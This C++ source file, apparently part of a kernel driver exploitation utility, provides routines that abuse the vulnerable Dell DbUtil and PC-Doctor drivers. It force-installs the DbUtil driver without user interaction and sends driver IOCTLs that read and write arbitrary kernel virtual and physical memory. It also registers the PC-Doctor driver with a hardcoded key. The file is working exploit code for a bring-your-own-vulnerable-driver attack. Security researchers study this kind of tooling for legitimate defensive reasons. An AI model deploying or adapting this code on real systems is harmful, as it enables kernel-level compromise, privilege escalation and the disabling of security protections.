/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       DELL.CPP
*
*  VERSION:     1.31
*
*  DATE:        24 Mar 2023
*
*  Dell drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/dell.h"

WCHAR g_DbUtilHardwareId[] = { L'R', L'O', L'O', L'T', L'\\', L'D', L'B', L'U', L't', L'i', L'l', L'D', L'r', L'v', L'2', 0, 0, 0, 0 };

#define DBUTILCAT_FILE TEXT("dbutildrv2.cat")
#define DBUTILINF_FILE TEXT("dbutildrv2.inf")

SUP_SETUP_DRVPKG g_DbUtilPackage;

/*
* DbUtilStartVulnerableDriver
*
* Purpose:
*
* Start vulnerable driver callback.
* Install DbUtil device.
*/
BOOL DbUtilStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL          bLoaded = FALSE;
    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
    LPWSTR        lpDeviceName = provLoadData->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        RtlSecureZeroMemory(&g_DbUtilPackage, sizeof(g_DbUtilPackage));

        g_DbUtilPackage.CatalogFile = DBUTILCAT_FILE;
        g_DbUtilPackage.CatalogFileResourceId = IDR_DATA_DBUTILCAT;

        g_DbUtilPackage.InfFile = DBUTILINF_FILE;
        g_DbUtilPackage.InfFileResourceId = IDR_DATA_DBUTILINF;

        g_DbUtilPackage.Hwid = (BYTE*)&g_DbUtilHardwareId;
        g_DbUtilPackage.HwidLength = sizeof(g_DbUtilHardwareId);

        g_DbUtilPackage.InstallFlags = INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE;

        bLoaded = supSetupManageDriverPackage(Context, TRUE, &g_DbUtilPackage);
    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }
    else {
        supShowWin32Error("[!] Vulnerable driver is not loaded", GetLastError());
    }

    return (Context->DeviceHandle != NULL);
}

/*
* DbUtilStopVulnerableDriver
*
* Purpose:
*
* Stop vulnerable driver callback.
* Uninstall DbUtil device and remove files.
*
*/
VOID DbUtilStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpFullFileName = Context->DriverFileName;

    supSetupRemoveDriver(g_DbUtilPackage.DeviceInfo, &g_DbUtilPackage.DeviceInfoData);
    supSetupManageDriverPackage(Context, FALSE, &g_DbUtilPackage);

    if (supDeleteFileWithWait(1000, 5, lpFullFileName))
        printf_s("[+] Vulnerable driver file removed\r\n");
}

/*
* DbUtilReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    DWORD dwError = ERROR_SUCCESS;
    DBUTIL_READWRITE_REQUEST* pRequest;

    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

    pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Unused = 0xDEADBEEF;
            pRequest->VirtualAddress = VirtualAddress;
            pRequest->Offset = 0;

            bResult = supCallDriver(DeviceHandle,
                IOCTL_DBUTIL_READVM,
                pRequest,
                (ULONG)size,
                pRequest,
                (ULONG)size);

            if (!bResult) {
                dwError = GetLastError();
            }
            else {
                RtlCopyMemory(Buffer, pRequest->Data, NumberOfBytes);
            }

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* DbUtilWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    DWORD dwError = ERROR_SUCCESS;

    DBUTIL_READWRITE_REQUEST* pRequest;

    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

    pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Unused = 0xDEADBEEF;
            pRequest->VirtualAddress = VirtualAddress;
            pRequest->Offset = 0;
            RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

            bResult = supCallDriver(DeviceHandle,
                IOCTL_DBUTIL_WRITEVM,
                pRequest,
                (ULONG)size,
                pRequest,
                (ULONG)size);

            if (!bResult)
                dwError = GetLastError();

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* DpdReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI DpdReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    PVOID pvBuffer = NULL;

    PCDCSRVC_READWRITE_REQUEST request;
    SIZE_T size;

    size = sizeof(PCDCSRVC_READWRITE_REQUEST) + NumberOfBytes;
    pvBuffer = (PVOID)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pvBuffer) {

        if (VirtualLock(pvBuffer, size)) {

            request.PhysicalAddress.QuadPart = PhysicalAddress;
            request.Size = NumberOfBytes;
            request.Granularity = 0; //use direct memmove

            bResult = supCallDriver(DeviceHandle,
                IOCTL_PCDCSRVC_READPHYSMEM,
                &request,
                sizeof(PCDCSRVC_READWRITE_REQUEST),
                pvBuffer,
                NumberOfBytes);

            if (bResult) {

                RtlCopyMemory(Buffer,
                    pvBuffer,
                    NumberOfBytes);

            }

            VirtualUnlock(pvBuffer, size);
        }

        VirtualFree(pvBuffer, 0, MEM_RELEASE);

    }

    return bResult;
}

/*
* DpdWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI DpdWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    PCDCSRVC_READWRITE_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(PCDCSRVC_READWRITE_REQUEST) + NumberOfBytes;
    pRequest = (PCDCSRVC_READWRITE_REQUEST*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
            pRequest->Granularity = 0; //use direct memmove
            pRequest->Size = NumberOfBytes;

            //
            // Append data buffer to the tail.
            //
            RtlCopyMemory(
                RtlOffsetToPointer(pRequest, sizeof(PCDCSRVC_READWRITE_REQUEST)),
                Buffer,
                NumberOfBytes);

            bResult = supCallDriver(DeviceHandle,
                IOCTL_PCDCSRVC_WRITEPHYSMEM,
                pRequest,
                (ULONG)size,
                NULL,
                0);

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);

    }

    return bResult;
}

/*
* DellRegisterDriver
*
* Purpose:
*
* Dell drivers initialization routine.
*
*/
BOOL WINAPI DellRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG driverId = PtrToUlong(Param);
    ULONG keyValue = 0xA1B2C3D4;

    switch (driverId) {

    case IDR_PCDSRVC:

        return supCallDriver(DeviceHandle,
            IOCTL_PCDCSRVC_REGISTER,
            &keyValue,
            sizeof(ULONG),
            &keyValue,
            sizeof(ULONG));

    default:
        return TRUE;
    }
}
